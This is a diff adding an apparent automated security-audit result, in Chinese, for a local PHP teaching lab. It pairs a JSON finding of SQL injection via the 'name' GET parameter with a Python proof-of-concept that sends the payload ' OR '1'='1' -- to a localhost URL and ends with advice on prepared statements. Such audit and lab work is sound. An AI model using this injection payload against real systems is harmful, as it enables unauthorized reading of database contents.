@@ -1,0 +1,86 @@
+```json
+{
+  "sample_id": "S001",
+  "prediction": "vulnerable",
+  "vulnerability_type": "SQL注入",
+  "locations": ["F01:0007", "F01:0010", "F01:0011"],
+  "evidence": {
+    "source": "F01:0007 从 $_GET['name'] 读取外部输入并赋给 $name",
+    "flow": "F01:0010 将 $name 直接拼接到 WHERE name = '...' 的SQL字符串中",
+    "guard": "无效：未使用预处理绑定、转义或白名单，$name 可改变SQL结构",
+    "sink": "F01:0011 调用 $db->query($sql) 执行拼接后的SQL"
+  },
+  "prerequisites": [
+    "本地PHP+MariaDB教学环境可通过 http://127.0.0.1:4280/lab_cases/S001/index.php 访问",
+    "common/db_connect.php 能正常提供已连接的 mysqli 变量 $db",
+    "lab_people 表存在并预置 1 Alice、2 Bob、3 Carol",
+    "无需登录，攻击者可通过 GET 参数 name 传入引号控制SQL结构"
+  ],
+  "missing_context": [],
+  "poc_generated": true,
+  "poc_language": "python3",
+  "poc_instructions": "在本地教学环境保存并运行 python3 s001_poc.py；脚本先请求 name=Alice 作为普通对照，再请求 name=' OR '1'='1' -- （URL编码）作为不修改数据的测试输入；预期普通响应正文仅包含 Alice，测试响应正文包含 Bob 和 Carol 或显示三行结果；脚本会打印实际观察，失败时检查 127.0.0.1:4280 服务、index.php 路径、lab_people 预置数据、common/db_connect.php 连接及错误日志，不能以 HTTP 200 作为成功条件。"
+}
+```
+
+```python
+#!/usr/bin/env python3
+import urllib.parse
+import urllib.request
+
+URL = "http://127.0.0.1:4280/lab_cases/S001/index.php"
+TIMEOUT = 5
+
+
+def fetch(name):
+    query = urllib.parse.urlencode({"name": name})
+    req = urllib.request.Request(
+        URL + "?" + query,
+        headers={"User-Agent": "S001-local-audit-poc"},
+    )
+    with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
+        body = resp.read().decode("utf-8", "replace")
+        return resp.status, body
+
+
+def main():
+    normal_name = "Alice"
+    test_name = "' OR '1'='1' -- "
+
+    print("[*] 目标:", URL)
+    print("[*] 普通对照 name =", repr(normal_name))
+    status_normal, body_normal = fetch(normal_name)
+    print("[*] 普通对照 HTTP 状态:", status_normal)
+    print("[*] 普通对照正文片段:")
+    print(body_normal[:500])
+
+    print("\n[*] 测试输入 name =", repr(test_name))
+    status_test, body_test = fetch(test_name)
+    print("[*] 测试输入 HTTP 状态:", status_test)
+    print("[*] 测试输入正文片段:")
+    print(body_test[:800])
+
+    normal_has_alice = "Alice" in body_normal
+    normal_has_bob = "Bob" in body_normal
+    normal_has_carol = "Carol" in body_normal
+    test_has_bob = "Bob" in body_test
+    test_has_carol = "Carol" in body_test
+
+    print("\n[实际观察]")
+    print("普通对照包含 Alice:", normal_has_alice)
+    print("普通对照包含 Bob:", normal_has_bob)
+    print("普通对照包含 Carol:", normal_has_carol)
+    print("测试输入包含 Bob:", test_has_bob)
+    print("测试输入包含 Carol:", test_has_carol)
+
+    if normal_has_alice and not normal_has_bob and not normal_has_carol and test_has_bob and test_has_carol:
+        print("观察结果与SQL注入路径的预期一致：测试输入改变了查询结果集合。")
+    else:
+        print("未观察到预期差异。请检查服务、路径、数据库预置数据、连接文件和错误日志；不要仅凭 HTTP 200 判断成功。")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+防护建议（未作为已验证事实）：应将查询改为固定SQL并使用 mysqli 预处理绑定，例如 `WHERE name = ?` 后 `bind_param`；不要将 `$_GET['name']` 拼入SQL。现有 `htmlspecialchars` 只降低输出XSS风险，不能防止SQL注入。
